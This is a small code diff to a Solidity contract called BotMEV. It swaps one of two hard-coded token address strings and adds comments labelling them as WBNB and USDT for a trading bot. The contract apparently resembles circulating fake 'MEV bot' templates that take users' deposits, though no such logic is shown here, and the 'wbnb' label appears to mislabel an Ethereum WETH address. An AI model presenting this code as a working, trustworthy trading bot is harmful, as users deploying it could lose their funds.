@@ -58,8 +58,8 @@ contract BotMEV {
             uint b;
 
             // need change WETH_CONTRACT_ADDRESS and TOKEN_CONTRACT_ADDRESS(which you wangt trade)
-            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
-            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"; //wbnb
+            string memory TOKEN_CONTRACT_ADDRESS = "0x2B90E061a517dB2BbD7E39Ef7F733Fd234B494CA"; //usdt
 
             loadCurrentContract(WETH_CONTRACT_ADDRESS);
             loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
